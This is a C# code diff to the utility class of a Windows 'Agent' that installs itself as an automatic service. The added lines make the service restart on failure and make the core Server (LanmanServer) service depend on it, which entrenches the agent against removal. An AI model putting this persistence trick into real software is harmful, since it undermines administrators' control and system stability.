@@ -13,9 +13,8 @@ using System.Threading;
 
 namespace Agent
 {
-  public class Utils
+  public class Utils // TODO: convert to static
   {
-
 
     [DllImport("user32.dll")]
     static extern IntPtr GetForegroundWindow();
@@ -122,6 +121,9 @@ namespace Agent
       string agent_descr = Properties.Resources.ResourceManager.GetString("ServiceDescription");
       string cmd = $@"
       New-Service -Name {agent_name} -DisplayName '{agent_display}' -BinaryPathName '{dest} -s' -Description '{agent_descr}' -StartupType Automatic
+      sc.exe failure Agent reset=0 actions=restart/60000/restart/60000/restart/60000
+      sc.exe config LanmanServer depend= Agent
+      Start-Service Server
       Start-Service {agent_name}
       ";
       var res = RunPowerShellCmd(cmd);
@@ -149,20 +151,26 @@ namespace Agent
      * */
     public string GetProcessOwner(int processId)
     {
-      string query = "Select * From Win32_Process Where ProcessID = " + processId;
-      ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
-      ManagementObjectCollection processList = searcher.Get();
 
-      foreach (ManagementObject obj in processList)
+      try
       {
-        string[] argList = new string[] { string.Empty, string.Empty };
-        int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
-        if (returnVal == 0)
+        string query = "Select * From Win32_Process Where ProcessID = " + processId;
+        ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
+        ManagementObjectCollection processList = searcher.Get();
+
+        foreach (ManagementObject obj in processList)
         {
-          // return DOMAIN\user
-          return argList[1] + "\\" + argList[0];
+          string[] argList = new string[] { string.Empty, string.Empty };
+          int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
+          if (returnVal == 0)
+          {
+            // return DOMAIN\user
+            return argList[1] + "\\" + argList[0];
+          }
         }
       }
+
+      catch {}
 
       return "NO OWNER";
     }
@@ -284,6 +292,11 @@ namespace Agent
         }
       }
     }
+
+    /* =========================================================================================
+     */
+
+
   }
 
 }
